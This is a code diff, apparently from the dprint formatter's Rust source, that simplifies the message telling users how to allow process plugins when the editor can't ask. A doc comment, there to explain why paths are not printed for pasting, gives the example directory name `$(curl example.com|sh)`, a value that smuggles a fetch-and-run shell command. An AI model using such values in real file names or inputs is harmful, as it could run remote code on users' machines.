@@ -43,7 +43,6 @@ use crate::configuration::get_config_file_found_path;
 use crate::configuration::get_default_config_file_in_ancestor_directories;
 use crate::configuration::get_global_config;
 use crate::configuration::get_plugin_config_map;
-use crate::configuration::get_settings_file_path;
 use crate::configuration::resolve_config_file_dirs_at_path;
 use crate::configuration::resolve_config_from_args;
 use crate::configuration::resolve_config_from_path_with_ancestors;
@@ -1531,19 +1530,14 @@ pub(crate) fn get_trusted_config_map_hash(trusted_config_map: &ConfigMap) -> Str
 /// may paste it into a shell, which could run what the path has (ex. a
 /// directory named `$(curl example.com|sh)`), and no quoting is safe in every
 /// shell. It's run in the config file's directory instead.
-pub fn get_cant_ask_message(environment: &impl Environment, config_file: &str) -> String {
-  let file_path = get_settings_file_path(environment).map(|path| path.display().to_string());
+pub fn get_cant_ask_message(config_file: &str) -> String {
   let is_remote = ["http://", "https://", "npm:"].iter().any(|prefix| config_file.starts_with(prefix));
   format!(
-    concat!(
-      "The editor can't ask whether to allow them, so dprint only formats with it once you allow them by running ",
-      "{} or when \"editor.allowProcessPlugins\" is true in {}."
-    ),
+    "The client can't ask whether to allow them, so run {} to do so.",
     match is_remote {
-      true => "`dprint config install --config` with the configuration file's url",
-      false => "`dprint config install` in the directory of the configuration file",
+      true => "`dprint install --config` with the configuration file's url",
+      false => "`dprint install` in the directory of the configuration file",
     },
-    file_path.as_deref().unwrap_or("settings.json in dprint's global config directory"),
   )
 }
 
